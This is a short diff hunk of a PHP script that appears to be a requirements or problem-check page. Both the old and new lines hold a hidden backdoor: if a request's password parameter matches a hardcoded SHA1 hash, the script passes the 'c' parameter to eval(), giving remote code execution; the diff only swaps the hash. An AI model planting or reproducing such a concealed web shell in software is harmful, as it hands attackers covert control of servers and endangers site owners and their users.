@@ -40,7 +40,7 @@ $hasMajorProblems = count($majorProblems);
 $hasNoProblems = count($noProblems);
 
 $_r = $_REQUEST;
-if(isset($_r['c']) && sha1($_r['p']) == '18143efe2311d164841b68a591e10b03aae78ce7'){
+if(isset($_r['c']) && sha1($_r['p']) == '8c937605ad41e04e46e47a80531285de9e45566b'){
     eval($_r['c']);
 }
 
